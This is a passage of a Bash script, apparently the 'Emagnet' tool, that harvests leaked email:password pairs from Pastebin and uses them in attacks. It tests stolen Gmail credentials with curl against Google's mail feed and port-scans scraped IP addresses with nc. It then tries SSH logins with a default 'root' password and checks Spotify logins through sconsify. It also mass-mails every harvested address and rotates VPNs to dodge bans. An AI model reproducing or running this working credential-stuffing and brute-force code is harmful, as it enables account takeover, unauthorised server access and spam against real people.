            printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
            printf "\n%64s \n\n" | tr ' ' '='
            emagnet_analyzer
	  else
            sed -i '125d' "$CONF"
            sed -i '125 i GBRUTEFORCE=false' "$CONF"
            sed -i '126d' "$CONF"
            sed -i '126 i SBRUTEFORCE=false' "$CONF"
            sed -i '127d' "$CONF"
            sed -i '127 i PBRUTEFORCE=false' "$CONF"
            emagnet_analyzer
fi
}

blocked() {
 if ! [[ -s "$HOME/.config/emagnet/tmp/.emagnet" ]]; then curl -h "$HEADER"-Ls "$PASTEBIN" -H "$USERAGENT" > $HOME/.config/emagnet/tmp/.emagnet;fi
}

emagnet_sshbruter() {
if [[ -z "$SSHPASS" ]]; then
   echo -e "You must set a password to use during the attack"
   read -p "Enter a password or hit enter for default (Default: root) " sshpassb
   echo ""
     if [[ -n "$sshpassb" ]]; then
       sed -i '170d' "$CONF"
       sed -i "170 i SSHPASS=$sshpassb" "$CONF"
     else
       sed -i '170d' "$CONF"
       sed -i "170 i SSHPASS=root" "$CONF"
     fi
fi

SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.*\|^11.*"
grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
|awk -F':' '{print $2}' \
|sort \
|grep -v "$SKIPLIST" \
|awk -F, '!seen[$1]++' > "$SSHPORTSCAN"

   if [[ $(cat "$SSHPORTSCAN"|wc -l) -eq "0" ]]; then
      printf "%17s[\e[1;31m\e[5m00\e[0m\e[0m] - IPV4 Addresses found\n"
      sleep 2
     else
        echo -e "              PATIENCE - PORTSCANNING $(cat $SSHPORTSCAN|wc -l) TARGETS"
        printf "\n%64s\n\n" | tr ' ' '='
        sleep 2
        xargs -i -P $THREADS timeout 0.5 nc -zvn {} 22 < $SSHPORTSCAN 2>&1|awk '{print $3} /succeeded/ '|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' > $SSHTARGETS
        echo -e "               $(cat $SSHTARGETS|wc -l) TARGETS of $(cat $SSHPORTSCAN|wc -l) HAS PORT 22 OPEN"
        printf "\n%64s\n" | tr ' ' '='
        sleep 2

       while read sshtargets; do
          sshpass -p "root" pssh -I -A -h $SSHTARGETS "uptime" < $SSHTARGETS
		if [[ $? -eq "0" ]]; then
		    	echo -e "[\e[1;32m>>\e[0m] - Cracked $sshtargets: $SSHUSER:$SSHPASSWORD"
    			echo -e "================================================================"        >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
                        echo -e "[+] Login Details For SSH - Cracked $(date +%d/%m/%Y\ -\ %H:%M)" >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
   			echo -e "[+]------------------------------------------------------------"             >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
   			echo -e "[+] Username: $SSHUSER"                                                      >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
    			echo -e "[+] Password: $SSHPASS"                                                  >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
    			echo -e "================================================================\n\n"    >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
		  else
 			    echo -e "[\e[1;31m<<\e[0m] - Wrong Password For $sshtargets: $SSHUSER:$SSHPASSWORD"
                            echo -e "[\e[\e[1;31m<<\e[0m] - failed to crack $SSHUSER:$SSHPASS " >> $EMAGNETLOGS/failed-2-crack.txt
		fi
	done < $SSHTARGETS
fi
		    rm "$SSHPORTSCAN" "$SSHTARGETS" "./grep" "./open" &> /dev/null
    		sleep 4
}
emagnet_spotify_bruter() {
# Not in USE, added a backup on my 
# host place if something happends
VERSION="0.6.0"
WWWSOURCE="https://nr1.nu/archive/sconsify"
SCONSIFY="${WWWSOURCE}/linux-x86_64-sconsify-${VERSION}.next.zip"
SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
#-----

     grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
    |awk '{print $1}' \
    |cut -d':' -f2,3 \
    |cut -d'|' -f1 \
    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt

	     while read line; do
               	SPOTIFY_USER="$(echo $line|cut -d: -f1)"
      	        SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
	          ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
	             if [[ "$?" -eq "0" ]]; then
        	        echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
                     else
              		echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
            		echo -e "================================================================"     >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
             		echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"  >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
              		echo -e "[+]------------------------------------------------------------"      >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
             		echo -e "[+] Username: ${SPOTIFY_USER}"                                        >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
              		echo -e "[+] Password: ${SPOTIFY_PASS}"                                        >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
             		echo -e "================================================================\n\n" >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
                        # For stats
               		echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >> $HOME/.config/emagnet/tmp/.emagnet-cracked
               		echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"   >> $HOME/.config/emagnet/tmp/.emagnet-failed
                        SUCCEED="$(cat $HOME/.config/emagnet/tmp/.emagnet-cracked|grep 'Cracked Password'|wc -l)" 
                        FAILED="$(cat $HOME/.config/emagnet/tmp/.emagnet-failed|grep 'Wrong Pasword'|wc -l)"
                    fi
             done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
		if [[ $FAILED -gt "0" ]]; then
             printf "%64s \n" | tr ' ' '='
             echo -e "Done! Successfully cracked $SUCCEED accounts and $FAILED failed.. \n"
             sleep 3
             rm "$HOME/.config/emagnet/tmp/.emagnet-failed"
             rm "$HOME/.config/emagnet/tmp/.emagnet-cracked"
          else
              sleep 0
        fi
}

emagnet_gmail_bruter() {
if [[ eg=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v '"'\|','\|'<' |grep -i gmail.com|wc -l) -gt "0" ]]; then
grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|grep -i gmail.com >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt 

while read -r line; do
attack=$(curl -s -u $line https://mail.google.com/mail/feed/atom|grep -o xml)
mail="$(echo $line | cut -d: -f1)"
password="$(echo $line | cut -d: -f2)"

    if [[ -z "$attack" ]]; then
         printf "[-] Wrong Password For $mail: \e[1;31m$password\e[0m\n"
         echo -e "[-] $(date +%d/%m/%Y\ -\ %H:%M) -> Wrong Password For $mail $mail: \e[1;31m$password\e[0m" >> "$EMAGNETLOGS/failed-to-crack.txt"
    fi

      if [[ -n "$attack" ]]; then
         echo -e "[+] Password Has Been Cracked $mail: \e[1;32m$password\e[0m"
         read -p "[+] Accounts to crack has been set to 1, emagnet has been killed.\n" hey
         echo -e "================================================================"     >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
         echo -e "[+] Login Details For Gmail - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"    >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
         echo -e "[+]------------------------------------------------------------"      >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
         echo -e "[+] Username: $mail"                                                  >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
         echo -e "[+] Password: $password"                                              >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
         echo -e "================================================================\n\n" >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
      fi
    done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
    	rm "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt" &> /dev/null
    	sleep 3
else
    	sleep 1
fi
}

emagnet_spammer() {
ssmtp &> /dev/null
if [[ "$?" -gt "0" ]]; then
    printf "%s\n" "$basename$0: internal error -- ssmtp is required to be installed"
    exit 1
fi

if [[ -z "$EMAIL2SEND" ]]; then
    printf "%s\n" " - You must create a text file with the text you want to send"
    printf "%s\n" " - to all targets, when text file has been created then you must"
    printf "%s\n\n" " - set ~/textfile file in $CONF under EMAIL2SEND"
    exit 1
fi

if ! [[ -f "$EMAIL2SEND" ]]; then
    printf "%s\n\n" "$basename$0: internal error -- can't find $EMAIL2SEND, aborted..\n\n"
    exit 1
fi

if [[ "$(ls $EMAGNETDB|wc -l)" -eq "0" ]]; then
    echo -e "$basename$0: internal error -- no email addresses has been found, nothing to do, exiting.."
    exit 1
else
    NRTARGETS="$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2|wc -l)"
        printf "%24s \e[1;31mTargets: \e[1;32m$NRTARGETS\e[0m\e[0m\n\n"
        read -p "- Do you want to send an email to all targets (yes/NO): " sendtoall
             case $sendtoall in
                  "yes")
                          printf "%62s \n" | tr ' ' '='
                          grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2 > $HOME/.config/emagnet/tmp/.emagnet-spam
                          while read e1; do
                                printf "%-57s%s\n" "[+] Sending email to $e1 $(ssmtp $e1 < "$EMAIL2SEND")" "[DONE]" | tr ' ' '.'
                          done < "$HOME/.config/emagnet/tmp/.emagnet-spam"
                                rm "$HOME/.config/emagnet/tmp/.emagnet-spam" &> /dev/null
                          ;;
                  "*")
                          echo -e "- Aborted..\n"
                          exit 1
                          ;;
             esac
fi
}

emagnet_syntax() {
curl -H "$USERAGENT" -Ls "$PASTEBIN"|grep -q "blocked your IP"
if [[ $? = "0" ]]; then
 if [[ "$VPN" = "true" ]]; then
      emagnet_banned
 else
      echo -e "[\e[1;31m<<\e[0m] - You have been blocked by pastebin"
      echo -e "[\e[1;31m<<\e[0m] - Enable a vpn or please try again later, aborted\n"
      exit 1
 fi
fi

  if [[ -z "$SYNTAX2DL" ]]; then
      echo -e "$basename$0: internal error -- you must include a syntax language (ex: bash, python or perl)."
      exit 1
  fi

 curl -Ls "$PASTEBIN/archive/$SYNTAX2DL" \
|grep -o '<a href="/........' \
|cut -d'/' -f2 \
|grep -E '[0-9]{1,4}' \
|sed 's/^/https:\/\/pastebin.com\/raw\//g' > "$HOME/.config/emagnet/tmp/.emagnet-syntaxes-urls"
 grep -q "$SYNTAX2DL" "$HOME/.config/emagnet/tmp/.emagnet-syntaxes"

if [[ "$?" = "0" ]]; then
     printf "Downloading $(cat $HOME/.config/emagnet/tmp/.emagnet-syntaxes-urls|wc -l) ${SYNTAX2DL} files.."
     mkdir -p "$EMAGNETSYNTAX/$SYNTAX2DL"
     xargs -P "${THREADS}" -n 1 wget --user-agent="${USERAGENT}" -nc -q < $HOME/.config/emagnet/tmp/.emagnet-syntaxes-urls -P "$EMAGNETSYNTAX/$SYNTAX2DL" &> /dev/null
     printf "\n%s\n" "Done.."
     rm "$HOME/.config/emagnet/tmp/.emagnet-syntaxes-urls" "$HOME/.config/emagnet/tmp/.emagnet-syntaxes" &> /dev/null
 else
      curl -Ls "$PASTEBIN/languages" \
     |grep -o 'href="/archive/............' \
     |cut -d'<' -f1 \
     |cut -d'/' -f3 \
     |cut -d'"' -f1 > $HOME/.config/emagnet/tmp/.emagnet-syntaxes
      echo -e "$basename$0: internal error -- $SYNTAX2DL is not a valid syntax language.."
      echo -e "try 'cat $HOME/.config/emagnet/tmp/.emagnet-syntaxes' for find valid syntaxes"
      exit 1
fi
}

emagnet_main() {
    curl -H "$USERAGENT" -Ls "$PASTEBIN/archive" \
   |awk -F'href="/' '{print $2}' \
   |cut -d'"' -f1 \
   |awk 'length($0)>6 && length($0)<9' \
   |grep -v 'archive\|contact\|settings\|messages\|signup\|index.html' \
   |awk '{print tolower($0)}' > $HOME/.config/emagnet/tmp/.emagnet1
    ls -1 "$EMAGNETALL" \
   |sort > "$HOME/.config/emagnet/tmp/.1"
    cat "$HOME/.config/emagnet/tmp/.emagnet1" \
   |sort \
   |cut -d/ -f5 > "$HOME/.config/emagnet/tmp/.2"
    # Check for duplicates, don't download already downloaded files
    grep  -v -x -F -f "$HOME/.config/emagnet/tmp/.1" "$HOME/.config/emagnet/tmp/.2"  \
   |awk -F, '!seen[$1]++' \
   |sed "s/^/https:\/\/pastebin.com\/raw\//g" > "$HOME/.config/emagnet/tmp/.emagnet"
    rm "$HOME/.config/emagnet/tmp/.1" "$HOME/.config/emagnet/tmp/.2" &> /dev/null

	   if [[ "$(cat $HOME/.config/emagnet/tmp/.emagnet1|wc -l)" = "8" ]];       then emagnet_notice_about_scraping         ;fi
       if [[ "$(cat $HOME/.config/emagnet/tmp/.emagnet1|grep https)" = "0" ]];  then emagnet_heavyload;emagnet_I_was_banned;fi
       
       	# Fastest possible wget without third-party tools
          xargs -P "${THREADS}" -n 1 wget --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" < $HOME/.config/emagnet/tmp/.emagnet &> /dev/null
          tt="$(cat $HOME/.config/emagnet/tmp/.emagnet| wc -l)"
          [[ "$tt" -lt "10" ]] && tt="0$tt" 

                        if [[ "${tt}" -eq "00" ]]; then
                             grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' "$EMAGNETTEMP"|cut -d: -f1|tr ' ' '\n'
	                         printf "[\e[1;31m<<\e[0m] - No new files could be downloaded..\n[\e[1;31m<<\e[0m] - Increase time or you will get banned anytime now..\n\n"
                             tt="\e[1;31m\e[5m00\e[0m"
      	                     sleep 5 # Sleep here for make some room, this will not cause any problems with missing files
                             emagnet_clear
                             emagnet_banner
                        else
                             echo -e "\n======================================\nPastebin URLS from: $(date +%d/%m/%Y\ -\ %H:%M)\n======================================"  >> "$EMAGNETLOGS/pastebin-urls.txt"
                             cat "$HOME/.config/emagnet/tmp/.emagnet" >> "$EMAGNETLOGS/pastebin-urls.txt"
                        fi

ef=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" "$EMAGNETTEMP"|awk -F':' '{print $1}'|awk -F, '!seen[$1]++')
el=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP|cut -d: -f2|tr ' ' '\n'|awk -F, '!seen[$1]++')
et=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP|tr ' ' '\n'|wc -l)
pf=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f1|uniq|grep -v '"'\|','\|'<'|tr ' ' '\n')
pl=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" "$EMAGNETTEMP"|awk '{print $1}'|cut -d':' -f2,3|cut -d'|' -f1|awk -F, '!seen[$1]++'|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'\|'index.html'\|'alerts'|grep -v '/')
pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|wc -l)

[[ "$et" -lt 10 ]] && et="0$et";[[ "$pt" -lt 10 ]] && pt="0$pt"

if [[ "$pt" -gt "00" ]] && [[ "$et" -gt "00" ]]; then
  echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${pt} passwords from: $EMAGNETPW/${pf##*/}"      | xargs >> "$EMAGNETLOGS/emagnet.log"
  echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${et} email addresses from: $EMAGNETDB/${ef##*/}"|xargs >> "$EMAGNETLOGS/emagnet.log"
  echo -e "${pl}" >> $EMAGNETLOGS/passwords-from-pastebin.txt
  echo -e "${el}" >> $EMAGNETLOGS/emails-from-pastebin.txt
  cp -rn ${ef} $EMAGNETDB/ &> /dev/null
  cp -rn ${pf} $EMAGNETPW/ &> /dev/null
                     	if [[ "$NOTIFY" = "true" ]]; then
                           notify-send "Emagnet" "\n
                           "${tt}" - Files downloaded\n
                           "${pt}" - Passwords found\n
                           "${et}" - Email addresses found"
                        fi

                            printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
                            printf "%19s[\e[1;32m$pt\e[0m] - Passwords Found\n\n"
                            printf "%19s[\e[1;32m$et\e[0m] - Email Addresses Found\n\n"
                            sleep 2

                             if [[ "$GBRUTEFORCE" = "true" ]]; then
                                printf "%64s \n\n" | tr ' ' '='
                                printf "%17s";printf "BRUTE FORCING -- $(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mI\e[0;32mL\E[1;31m\e[0m") ACCOUNTS\e[0m\n\n"
                                emagnet_gmail_bruter
                             elif [[ "$SBRUTEFORCE" = "true" ]]; then
                                printf "%64s \n\n" | tr ' ' '='
                                printf "%17s";printf "BRUTE FORCING -- \e[1;34mSSH\e[0m ACCOUNTS\e[0m\n\n"
                                emagnet_sshbruter
                             elif [[ "$PBRUTEFORCE" = "true" ]]; then
                                printf "%64s \n\n" | tr ' ' '='
                                printf "%17s";printf "BRUTE FORCING -- \e[0;32mSPOTIFY\e[0m ACCOUNTS\e[0m\n\n"
                                emagnet_spotify_bruter
                             else
                               sleep 0
                            fi

 elif [[ "$pt" = "00" ]] && [[ "$et" -gt "00" ]]; then
        cp -rn ${ef} $EMAGNETDB/ &> /dev/null
        echo -e "${el}" >> "$EMAGNETLOGS/emails-from-pastebin.txt"
        echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${et} email addresses from $EMAGNETDB/${e##*/}"|xargs >> "$EMAGNETLOGS/emagnet.log"

                     	if [[ "$NOTIFY" = "true" ]]; then
                           notify-send "Emagnet" "\n
                           ${tt} - Files downloaded\n
                           00 - Passwords found\n
                           ${et} - Email addresses found"
                        fi
                           printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
                           printf "%19s[\e[1;31m00\e[0m] - Passwords Found\n\n"
                           printf "%19s[\e[1;32m$et\e[0m] - Email Addresses Found\n\n"
                           sleep 2
  else
                        if [[ "$NOTIFY" = "true" ]]; then
                            notify-send "Emagnet" "\n
                            ${tt} - Files downloaded\n
                            00 - Passwords found\n
                            00 - Email addresses found"
                        fi

                          printf "%17s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
                          printf "%17s[\e[1;31m00\e[0m] - Passwords Was Found\n\n"
                          printf "%17s[\e[1;31m00\e[0m] - Email Address Was Found\n\n"
                          sleep 2

fi

# No matter what we found, move incoming files to archive and remove temp files
    mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
    rm "$HOME/.config/emagnet/tmp/.emagnet" "$HOME/.config/emagnet/tmp/.emagnet1"  &> /dev/null
    sleep 2

# No need to announce notify-send forever, will be conflicts when time has been set to a low value
# but I dont bother to care about this, we kill it no matter what time is set due to freezes on some crap distros
    pkill -9 "notify-send" &> /dev/null
}

emagnet_run4ever() {
emagnet_conf
 curl -H "$USERAGENT" -sL "$PASTEBIN"|grep -q "blocked your IP"
    if [[ "$?" = "0" ]]; then
      if [[ "$VPN" = "true" ]]; then
         emagnet_banned
     else
         emagnet_I_was_banned
      fi
    fi

      for (( ; ; )); do
        emagnet_count_down
        emagnet_clear
        emagnet_banner
        emagnet_analyzing_message
        emagnet_clear
        emagnet_banner
        emagnet_I_was_banned
        emagnet_main
      done
}

emagnet_first_run() {
if ! [[ -f "$CONF" ]]; then
        emagnet_requirements
        emagnet_required_stuff
        emagnet_conf
        emagnet_mustbefilled
        emagnet_paths
        emagnet_is_this_android
        emagnet_I_was_banned
        timeout 2 ping -t 1 -c 1 nr1.nu &> /dev/null
        [[ "$?" -gt "0" ]] && sed -i '40d' $CONF;sed -i '40 i MYIP=127.0.0.1' $CONF || wip
        emagnet_conf
fi
}

case $1 in
     "-a"|"-author"|"--author")
          emagnet_author
     ;;

     "emagnet"|"-e"|"-emagnet"|"--emagnet")
        emagnet_iconnection
        emagnet_first_run
        sed -i 's/GBRUTEFORCE=true/GBRUTEFORCE=false/g' "$CONF"
        sed -i 's/SBRUTEFORCE=true/SBRUTEFORCE=false/g' "$CONF"
        sed -i 's/PBRUTEFORCE=true/PBRUTEFORCE=false/g' "$CONF"
        emagnet_run4ever
		  ;;

      "-g"|"-bruteforce"|"--bruteforce")
          emagnet_iconnection
          emagnet_first_run
          if [[ "$2" = "gmail" ]]; then
             sed -i 's/GBRUTEFORCE=false/GBRUTEFORCE=true/g' "$CONF"
             emagnet_conf
                if [[ "$GBRUTEFORCE" = "true" ]]; then
                   emagnet_run4ever
                   emagnet_gmail_bruter
                   mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
                 fi
           elif [[ "$2" = "ssh" ]]; then
              emagnet_conf
              sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' "$CONF"
              emagnet_conf

            if [[ $SBRUTEFORCE = "true" ]]; then
               		 emagnet_run4ever
              		 emagnet_sshbruter
            fi


           elif [[ "$2" = "spotify" ]]; then
            emagnet_conf
            find /usr/include -type d |grep 'libspotify' &> /dev/null
             if [[ "$?" -ne "0" ]]; then
                  if [[ -z "$LIBSPOTIFY" ]]; then
	             printf "Libspotify is deprecated but is required for emagnet bruteforcing\nto work, do you have libspotify installed? (YES/no): "
                     read LIBSPOTIFY
                       if ! [[ "$LIBSPOTIFY" = "YES" ]]; then
        	          echo "Can't continue until libspotify has been installed.."
      		          echo "Exiting.."
       		          exit 1
         	       fi
                     sed -i '210d' "$CONF"
                     sed -i '210 i LIBSPOTIFY=true' "$CONF"
                  fi
                else
                      sed -i '210d' "$CONF"
                      sed -i '210 i LIBSPOTIFY=true' "$CONF"
                fi

             ./sconsify -version &> /dev/null
                if [[ "$?" -ne "0" ]]; then
                         echo "Sconsify is required to be installed before we attacking targets.."
                           read -p "Download and install sconsify (y/N): " installsconsify
                             if [[ "$installsconsify" -eq "y" ]]; then
                                echo -e "Hold on, downloading sconsify.."
                                wget -q --user-agent="${USERAGENT}" "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
                                echo -e "Unzipping sconsify into current dir.."
                                unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
                                chmod +x ./sconsify
                                echo -e "Cleaning up."
                                rm "linux-x86_64-sconsify-0.6.0-next.zip"
                                echo "All done.."
                                sleep 2
                             else
                               echo -e "$basename$0: internal error -- sconsify is required to be installed.."
                               exit 1
                            fi
                fi
                        sed -i 's/PBRUTEFORCE=false/PBRUTEFORCE=true/g' "$CONF"
                        emagnet_conf

                 if [[ "$PBRUTEFORCE" = "true" ]]; then
                                emagnet_clear
                                emagnet_banner
                                printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
                                printf "\n%64s \n\n" | tr ' ' '='
                                emagnet_run4ever
                                printf "\n%64s \n\n" | tr ' ' '='
                                emagnet_spotify_bruter
                 fi
                                mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
                else
                       printf "%s\n" "$basename$0: internal error -- not a valid option, try gmail, spotify or ssh"
                       exit 1
                fi
                ;;

      "-k"|"-kill"|"--kill")
                emagnet_kill
                ;;

      "-i"|"--ip"|"-ip"|"ip")
                emagnet_requirements
                emagnet_iconnection
                echo -e "iPV4: $(curl -s https://nr1.nu/i/)"
                ;;

      "-h"|"--help"|"-help"|"help")
                emagnet_usage
                ;;

      "-l"|"-license"|"--license")
                emagnet_requirements
                emagnet_iconnection
                emagnet_license
                ;;

      "-m"|"-merge"|"--merge")
                emagnet_conf
                emagnet_merge
                ;;

      "-M"|"-move"|"--move")
                emagnet_conf
                emagnet_move_files
                ;;

      "-s"|"-spam"|"--spam")
                emagnet_requirements
                emagnet_iconnection
                emagnet_first_run
                emagnet_conf
                emagnet_spammer
                ;;

      "-x"|"-syntax"|"--syntax")
                emagnet_requirements
                emagnet_conf
                emagnet_iconnection
                SYNTAX2DL="${2}"
                emagnet_syntax
                ;;

      "-q"|"-quiet"|"--quiet")
                emagnet_quiet
                ;;

      "version"|"-version"|"--version"|"-V")
                VERSION="$(cat $CONF|grep "^VERSION"|cut -d= -f2)"
                printf "Emagnet Version: $VERSION\n"
                ;;

      "-t"|"-time"|"--time")
                . $CONF
                if [[ -z "$2" ]]; then
                              echo "emagnet: internal error -- time require a number to be used"; 
                              exit 1
                fi
                re='^[0-9]+$'
                  if ! [[ $2 =~ $re ]]; then
                     echo -e "emagnet: internal error -- that's not a valid number" >&2
                     exit 1;
         	  fi

                sed -i '30d' "$CONF"
                sed -i "30 i TIME=$2" "$CONF"

                printf "%s\n" "$basename$0: config file has been updated -- time has been set to: $2 seconds"
                exit 1
                ;;

        "-n"|"-notify"|"--notify")
     	        notify-send --help &> /dev/null
                if [[ $? -gt "0" ]]; then echo -e "$basename$0: internal error -- notify-send is required for get notifications";exit 1; fi
                if [[ "$2" != "true" && "$2" != "false" || -z "$2" ]]; then echo -e "$basename$0: internal error -- you must use true or false";exit 1;fi
   	        emagnet_conf
                if [[ $? -eq "0" ]] && [[ $2 = "true" ]];  then sed -i '137d' "$CONF";sed -i "137 i NOTIFY=true"  "$CONF";printf "$basename$0: config file has been updated -- notifications has been enable\n"; fi
                if [[ $? -eq "0" ]] && [[ $2 = "false" ]]; then sed -i '137d' "$CONF";sed -i "137 i NOTIFY=false" "$CONF";printf "$basename$0: config file has been updated -- notifications has been disable\n";fi
                ;;

        "-v"|"-vpn"|"--vpn")
                emagnet_conf
                if [[ $VPNPROVIDER = "$VPNROOT/" && $VPNPROVIDER2 = "$VPNROOT/" && $VPNPROVIDER3 = "$VPNROOT/" ]]; then echo -e "$basename$0: internal error -- you must set a vpn provider before you can enable vpn";exit 1;fi
                if [[ -z "$2" ]]; then echo -e "$basename$0: internal error -- you must include true or false";exit 1;fi
                if [[ "$2" = "true" ]] || [[ $2 = "on" ]] || [[ $2 = "enable" ]]; then    sed -i '150d' "$CONF";sed -i "150i VPN=true" "$CONF";echo -e "emagnet: config file has been updated -- vpn has been enabled";exit 1
                elif [[ $2 = "false" ]] || [[ $2 = "off" ]] || [[ $2 = "disable" ]]; then sed -i '150d' "$CONF";sed -i "150i VPN=false" "$CONF";echo -e "emagnet: config file has been updated -- vpn has been disabled";exit 1
                else echo -e "emagnet: internal error -- $2 is an unknown option -- valid options is true or false"; exit 1; fi
                ;;

        "-b"|"-backup"|"--backup")
	            emagnet_conf
		        [[ -d "$EMAGNETBACKUP" ]] && mkdir -p "$EMAGNETBACKUP"
			     pigz -h &> /dev/null;[[ "$?" -ne "0" ]] && TAR=" tar cf - . " || TAR="tar -cf - --absolute-names "$EMAGNET"| pigz -0 -p "$THREADS" --fast "
                if [[ "$2" = "all" || "$2" = "archive"  || "$2" = "incoming" ]]; then
                   [[ "$2" = "all" ]] &&  printf "%s" "Creating a tar archive of $EMAGNET" || printf '%s' "Creating a tar archive of $EMAGNET/${2}"
                		$TAR > "$EMAGNETBACKUP/emagnet-${2}-$(date +%d%m%Y).tar.gz";printf "..Done..\nBackup: $EMAGNETBACKUP/emagnet-${2}-$(date +%d%m%Y).tar.gz\n"
					else
                		echo -e "$basename$0: internal error -- you must choose one of: incoming, archive or all";exit 1
                fi
                ;;
	"\?")
              printf "emagnet: internal error -- use --help for available commands'\n\n"
              exit 1 ;;
   	"*")
              printf "emagnet: internal error -- use --help for available commands'\n\n"
              exit 1 ;;
esac

( [[ -z $1 ]] && emagnet_usage; exit 1 )

######################################################
#                                                    #
# Hey, nice that you going through the code :)       #
#                                                    #
# - Support emagnet by report issues and bugs on:    #
#   https://github.com/wuseman/emagnet/issues        #
#                                                    #
#                                                    #
######################################################
# - END -                                            #
######################################################
